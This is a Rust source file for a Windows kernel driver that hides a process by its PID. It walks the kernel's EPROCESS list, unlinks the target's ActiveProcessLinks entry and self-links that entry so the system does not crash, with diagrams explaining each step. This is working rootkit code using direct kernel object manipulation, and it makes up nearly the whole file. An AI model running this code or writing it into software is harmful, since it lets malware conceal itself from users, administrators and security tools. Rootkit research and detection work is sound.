
use alloc::string::{String, ToString};
use wdk_sys::LIST_ENTRY;
use wdk_sys::HANDLE;

mod shadowed_process;
use shadowed_process::ShadowedProcess;

extern "system" {
    fn PsGetCurrentProcess() -> HANDLE ;
}


pub fn shadow_process(target_pid: u32) -> Result<bool,String> {
    unsafe {
        let current_process = ShadowedProcess::from_eprocess(PsGetCurrentProcess());
        if (*current_process.pid) == target_pid {
            
            match remove_links(current_process.list_entry){
                Ok(true) => return Ok(true),
                Ok(false) => return Ok(false),
                Err(e) => return Err(e)
            };

        }

        let start_process = current_process.clone();
        let mut iter_process = current_process.next();

        while (start_process.eprocess as usize) != (iter_process.eprocess as usize) {
            if *(iter_process.pid) == target_pid {

                match remove_links(iter_process.list_entry){
                    Ok(true) => return Ok(true),
                    Ok(false) => return Ok(false),
                    Err(e) => return Err(e)
                };

            }
            iter_process = iter_process.next();
        }
    }

    return Err("Process not found".to_string());
}

unsafe fn remove_links(current: *mut LIST_ENTRY) -> Result<bool,String> {
    // BEFORE OPERATION
    // [Previous Process]   <-->   [Target Process]   <-->   [Next Process]
    //         ^                                                  ^
    //         |                                                  |
    //     (*Target).Blink                                    (*Target).Flink

    // AFTER OPERATION             
    //                              ---------
    //                              ↓       |
    //                [Target Process] ------
    //
    // [Previous]   <----------------->   [Next]
    //     (*Previous).Flink       (*Next).Blink


    // Check if pointer is null
    if current.is_null() {
        return Err("Current EPROCESS is null".to_string());
    }

    let previous: *mut LIST_ENTRY = (*current).Blink;
    let next: *mut LIST_ENTRY = (*current).Flink;

    // Check if previous and next pointers are valid ones
    if previous.is_null() || next.is_null() {
        return Err("Previous or Next EPROCESS is null".to_string());
    }

    // Bind Flink's previous process to the next process
    (*previous).Flink = next;

    // Bind Blink's next process to the previous process
    (*next).Blink = previous;

    // This will re-write the current LIST_ENTRY to point to itself to avoid BSOD
    let current_active_process_links: *mut LIST_ENTRY = &raw mut (*current).Flink as *mut LIST_ENTRY;
    (*current).Blink = current_active_process_links;
    (*current).Flink = current_active_process_links;

    return Ok(true);
}